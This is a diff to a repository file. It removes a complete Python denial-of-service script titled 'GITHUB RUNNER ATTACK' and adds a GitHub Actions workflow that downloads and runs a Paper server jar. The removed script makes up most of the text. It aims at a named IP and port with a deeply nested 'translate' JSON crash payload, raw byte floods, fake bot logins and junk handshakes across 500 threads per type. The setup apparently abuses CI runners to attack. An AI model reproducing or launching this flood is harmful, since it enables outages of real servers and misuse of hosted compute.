@@ -1,110 +1,39 @@
-#!/usr/bin/env python3
-"""
-GITHUB RUNNER ATTACK
-Target: 13.233.195.2:25566
-"""
+name: Paper World Defaults
 
-import socket
-import threading
-import time
-import json
-import random
-import sys
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
 
-TARGET_IP = "13.233.195.2"
-TARGET_PORT = 25566
-THREADS = 500
-DURATION = 30
+jobs:
+  build:
+    runs-on: ubuntu-latest
 
-PAYLOAD = {
-    "translate": "%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s",
-    "with": [{
-        "translate": "%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s",
-        "with": [{
-            "translate": "%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s",
-            "with": [{
-                "translate": "%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s",
-                "with": [{"text": "ouch!"}]
-            }]
-        }]
-    }]
-}
+    steps:
+      - uses: actions/checkout@v4
 
-def exploit():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(1)
-            s.connect((TARGET_IP, TARGET_PORT))
-            s.send(b'\x03' + json.dumps(PAYLOAD).encode())
-            s.close()
-        except:
-            pass
+      - name: Setup Java
+        uses: actions/setup-java@v4
+        with:
+          java-version: '21'
+          distribution: 'temurin'
 
-def flood():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.5)
-            s.connect((TARGET_IP, TARGET_PORT))
-            s.send(b'\xff' * 65535)
-            s.close()
-        except:
-            pass
+      - name: Download Paper from Release
+        run: |
+          wget -q https://github.com/turboig1934-droid/ttd/releases/download/test/paper-26.1.2-72.1.jar -O paper.jar
+          ls -la paper.jar
 
-def spam():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(1)
-            s.connect((TARGET_IP, TARGET_PORT))
-            s.send(b'\x00' + f"Bot{random.randint(1,99999)}".encode() + b'\x00')
-            s.close()
-        except:
-            pass
+      - name: Generate Configs
+        run: |
+          java -jar paper.jar --initSettings || true
+          ls -la
 
-def handshake():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.5)
-            s.connect((TARGET_IP, TARGET_PORT))
-            s.send(b'\x00' * 100)
-            s.close()
-        except:
-            pass
-
-def check():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(2)
-        r = s.connect_ex((TARGET_IP, TARGET_PORT))
-        s.close()
-        return r == 0
-    except:
-        return False
-
-print("[+] GITHUB RUNNER ATTACK STARTING...")
-print(f"[+] Target: {TARGET_IP}:{TARGET_PORT}")
-
-if check():
-    print("[+] Server ONLINE")
-else:
-    print("[-] Server OFFLINE")
-    sys.exit(1)
-
-print("[*] Launching attack...")
-for _ in range(THREADS):
-    threading.Thread(target=exploit, daemon=True).start()
-    threading.Thread(target=flood, daemon=True).start()
-    threading.Thread(target=spam, daemon=True).start()
-    threading.Thread(target=handshake, daemon=True).start()
-
-print(f"[+] {THREADS * 4} threads running!")
-print(f"[*] Running for {DURATION}s...")
-
-for i in range(DURATION):
-    time.sleep(1)
-    print(f"[*] {i+1}s / {DURATION}s", end="\r")
-
-print("\n[+] Attack complete!")
+      - name: Upload Configs
+        uses: actions/upload-artifact@v4
+        with:
+          name: paper-configs
+          path: |
+            *.yml
+            *.properties
+            *.json
+          if-no-files-found: warn
